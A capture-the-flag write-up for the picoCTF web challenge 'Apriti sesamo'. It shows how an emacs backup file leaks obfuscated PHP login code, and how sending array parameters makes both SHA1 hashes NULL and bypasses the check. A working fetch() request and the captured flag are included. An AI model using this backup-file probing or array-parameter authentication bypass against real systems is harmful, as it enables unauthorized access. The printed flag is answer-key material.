## Apriti sesamo

I think this is my favourite challenge so far, except for the fact that it's pretty hard to get started without the hint.

The webpage is a simple username and password box, along with a large ASCII message saying "log in if you can". Entering any incorrect credentials returns a message saying "Failed! No flag for you".

The two hints are "Backup files" and "Rumor has it, the lead developer is a militant emacs user". Considered together, it's clear these two hints are referring to how emacs creates backup files with a `~` at the end of the filename.

Changing the URL from `http://verbal-sleep.picoctf.net:58281/impossibleLogin.php` to `http://verbal-sleep.picoctf.net:58281/impossibleLogin.php~` reveals an old version of the webpage, with some of the password-checking logic visible in the source code:

```html
<!--?php
if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}?-->
```

I uncommented the PHP code, formatted it, and decoded the base64 strings for better readability:

```php
<?php
    if (isset($_POST[username]) && 
        isset($_POST[pwd])) {
        
        $yuf85e0677 = $_POST[username];
        $rs35c246d5 = $_POST[pwd];
        
        if ($yuf85e0677 == $rs35c246d5) {
            echo <br/>Failed! No flag for you
        } else {
            if (sha1($yuf85e0677) === sha1($rs35c246d5)) {
                echo file_get_contents(../flag.axt);
            } else {
                echo <br/>Failed! No flag for you
            }
        }
    }
?>
```

The code is pretty simple: if the username and password are the same, it returns "Failed! No flag for you". However, if the username and password are different, but the SHA1 hashes of the two are equal, it reads the contents of `../flag.axt` and returns it.

At first, I tried to find a collision for the SHA1 hash - about 8 years ago, someone found a [SHA1 collision](https://shattered.io/) that allowed them to create two different PDFs with the same SHA1 hash. However, due to the very small number of SHA1 collisions having been discovered, I realized that this probably wasn't the intended solution (and didn't feel like figuring out how to submit a PDF as a password).

Since pressing Login calls a POST request, I was able to test various inputs using the browser's developer tools. PHP's `sha1` function is only designed to work on strings, and it returns `NULL` if it's given an invalid input. By simply changing the body of the POST request from `username=abc&pwd=xyz` to `username[]=abc&pwd[]=xyz`, we are able to change the types of the inputs - the arrays are not equal, but their hashes are (`NULL === NULL`).

```js
fetch("http://verbal-sleep.picoctf.net:58281/impossibleLogin.php", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-CA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "upgrade-insecure-requests": "1",
    "Referer": "http://verbal-sleep.picoctf.net:58281/impossibleLogin.php",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "username[]=abc&pwd[]=xyz",
  "method": "POST"
}).then(response => response.text())
.then(data => {
  console.log(data);
})
.catch(error => {
  console.error("Error:", error);
});
```

```html
picoCTF{w3Ll_d3sErV3d_Ch4mp_5292ca30}
```